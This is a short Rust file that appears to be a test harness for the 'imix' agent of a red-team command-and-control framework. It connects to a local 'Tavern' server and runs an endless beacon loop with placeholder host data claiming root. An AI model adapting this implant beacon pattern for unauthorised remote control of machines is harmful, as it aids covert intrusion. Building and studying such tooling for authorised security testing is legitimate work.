use anyhow::Result;
use c2::TavernClient;
use imix::agent::Agent;

fn main() {
    let runtime = tokio::runtime::Builder::new_multi_thread()
        .worker_threads(128)
        .enable_all()
        .build()
        .unwrap();

    runtime.block_on(beacon_loop());
}

pub async fn beacon_loop() -> Result<()> {
    let tavern = TavernClient::connect("http://127.0.0.1".to_string()).await?;

    let mut agent = Agent {
        info: c2::pb::Beacon {
            identifier: "12345".to_string(),
            principal: "root".to_string(),
            interval: 10,
            agent: Some(c2::pb::Agent {
                identifier: "1234".to_string(),
            }),
            host: Some(c2::pb::Host {
                identifier: "1234".to_string(),
                primary_ip: "127.0.0.1".to_string(),
                name: "test".to_string(),
                platform: c2::pb::host::Platform::Linux as i32,
            }),
        },
        tavern,
        handles: Vec::new(),
    };

    loop {
        let result = agent.callback().await;

        match result {
            Ok(_) => {}
            Err(err) => {
                #[cfg(debug_assertions)]
                eprint!("Error draining channel: {}", err)
            }
        }

        std::thread::sleep(std::time::Duration::new(5 as u64, 24601));
    }
}
